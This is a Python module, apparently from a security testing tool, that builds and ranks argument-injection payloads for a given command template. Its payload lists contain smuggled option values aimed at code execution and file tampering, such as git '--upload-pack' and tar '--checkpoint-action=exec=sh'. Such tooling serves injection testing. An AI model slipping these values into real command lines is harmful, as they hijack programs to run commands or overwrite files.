"""Argument / option injection payload mutation engine."""

from __future__ import annotations

from dataclasses import dataclass, field

from ..models import Context, Risk
from .context import analyze_argument_context

# The input is its own argument: a leading option is parsed by the program.
_OPTION_BODIES = [
    ("--upload-pack=touch /tmp/pwn", "git-rce"),
    ("--checkpoint-action=exec=sh", "tar-rce"),
    ("-o /tmp/pwn", "output-file"),
    ("--output=/tmp/pwn", "output-long"),
    ("-K /tmp/attacker.conf", "config-read"),
    ("--config=/tmp/attacker.conf", "config-long"),
]

# The input is glued to a preceding token: needs word splitting to inject.
_VALUE_BODIES = [
    (" -o /tmp/pwn", "space-new-option"),
    (" --config=/tmp/attacker.conf", "space-config"),
]

_RISK_ORDER = {
    Risk.CRITICAL: 4,
    Risk.HIGH: 3,
    Risk.MEDIUM: 2,
    Risk.LOW: 1,
    Risk.NONE: 0,
}


@dataclass
class ArgumentCandidate:
    payload: str
    risk: Risk
    command_injected: bool
    syntax_valid: bool
    strategy: str


@dataclass
class ArgumentMutationResult:
    template: str
    context: Context
    generated: int
    valid: int
    candidates: list[ArgumentCandidate] = field(default_factory=list)

    @property
    def high_probability(self) -> list[str]:
        return [c.payload for c in self.candidates[:10]]

    def to_dict(self) -> dict:
        return {
            "template": self.template,
            "context": self.context.value,
            "generated": self.generated,
            "valid": self.valid,
            "high_probability": self.high_probability,
            "candidates": [
                {
                    "payload": c.payload,
                    "risk": c.risk.value,
                    "command_injected": c.command_injected,
                    "syntax_valid": c.syntax_valid,
                    "strategy": c.strategy,
                }
                for c in self.candidates
            ],
        }


def _bodies(context: Context):
    if context == Context.ARG_VALUE:
        return _VALUE_BODIES
    return _OPTION_BODIES


def mutate_argument(template: str) -> ArgumentMutationResult:
    """Generate and rank argument-injection payloads for ``template``."""
    from .analyzer import analyze_argument

    context = analyze_argument_context(template)
    generated = _bodies(context)

    candidates: list[ArgumentCandidate] = []
    for payload, strategy in generated:
        result = analyze_argument(template, payload)
        if result.breakout.command_injected:
            candidates.append(
                ArgumentCandidate(
                    payload=payload,
                    risk=result.risk,
                    command_injected=True,
                    syntax_valid=result.balance.syntax_valid,
                    strategy=strategy,
                )
            )

    candidates.sort(
        key=lambda c: (_RISK_ORDER[c.risk], c.syntax_valid, -len(c.payload)),
        reverse=True,
    )

    return ArgumentMutationResult(
        template=template,
        context=context,
        generated=len(generated),
        valid=len(candidates),
        candidates=candidates,
    )
